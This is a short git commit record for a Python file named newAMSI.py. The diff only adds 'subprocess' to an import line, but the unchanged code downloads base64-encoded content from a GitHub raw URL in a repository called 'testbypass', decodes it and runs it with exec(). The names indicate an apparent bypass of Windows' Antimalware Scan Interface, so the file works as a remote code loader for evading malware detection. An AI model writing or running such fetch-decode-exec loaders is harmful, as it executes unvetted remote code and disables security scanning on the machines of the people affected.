0569497897aa6e463fa27ec0248370c103ff6b85
EsInvoker1337 <91942587+Kiemtrau205@users.noreply.github.com>
2024-06-23 02:00:39 +0700

    Update newAMSI.py

--- newAMSI.py
+++ newAMSI.py
@@ -1,4 +1,4 @@
 import urllib.request
-import base64, ctypes
+import base64, ctypes, subprocess 
 
 exec(base64.b64decode(urllib.request.urlopen("https://raw.githubusercontent.com/Kiemtrau205/testbypass/main/patchAMSI").read()))
